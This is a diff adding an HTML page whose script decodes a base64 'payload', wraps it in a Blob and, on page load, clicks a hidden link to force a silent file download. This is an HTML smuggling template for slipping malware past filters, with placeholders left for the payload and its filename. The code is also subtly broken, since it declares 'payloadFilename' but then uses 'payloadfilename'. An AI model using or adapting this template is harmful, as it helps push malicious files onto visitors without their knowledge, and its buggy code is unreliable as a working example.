@@ -1,0 +1,58 @@
+<html>
+	<body>
+	</body>
+</html>
+<script>
+	/* Convert a base64-encoded string into an ArrayBuffer and return ArrayBuffer that 
+	 * can be used to create Blob:
+	 *   1. 'encodedData': input string containing base64-encoded bytes */
+	function base64ToArray(encodedData) {
+		/* atob() decodes a base64 string into a binary string where each character 
+		* represents a byte (0-255) */
+		var binaryData = window.atob(encodedData);
+
+		/* Determine the length of the binary string and create a Uint8Array of the same 
+		 * length to hold the byte values */
+		var len = binaryData.length;
+		var bytesArray = new Uint8Array(len);
+
+		/* Iterate over the binary string and copy the character code (byte value) into 
+		* the typed array */
+		for (var i = 0; i < len; i++) {
+			bytesArray[i] = binaryData.charCodeAt(i);
+		}
+
+		/* Return the underlying ArrayBuffer */
+		return bytesArray.buffer;
+	}
+
+	/* Replace '...' with your base64-encoded payload */
+	var encodedData = '...';
+
+	/* Convert the base64 string to an ArrayBuffer using the helper above */
+	var bytesArray = base64ToArray(encodedData);
+
+	/* Create a Blob from the ArrayBuffer */
+	var blobObject = new Blob([bytesArray], { type: 'application/octet-stream' });
+
+	/* Replace '...' with your desired payload filename */
+	var payloadFilename = '...';
+
+	/* Create an invisible <a> element, attach it to the document, and use it to trigger
+	 * an automatic download by setting href to an object URL and calling click() */
+	var anchor = document.createElement('a');
+	document.body.appendChild(anchor);
+	anchor.style = 'display: none';
+
+	/* Create a temporary object URL that points to the Blob. This URL can be used as the
+	 * 'href' of an anchor to download the Blob contents */
+	var url = window.URL.createObjectURL(blobObject);
+	anchor.href = url;
+
+	/* Set the filename for the download and programmatically click the anchor */
+	anchor.download = payloadfilename;
+	anchor.click();
+
+	/* Clean up the object URL to free memory. Once revoked, the URL becomes invalid */
+	window.URL.revokeObjectURL(url);
+</script>
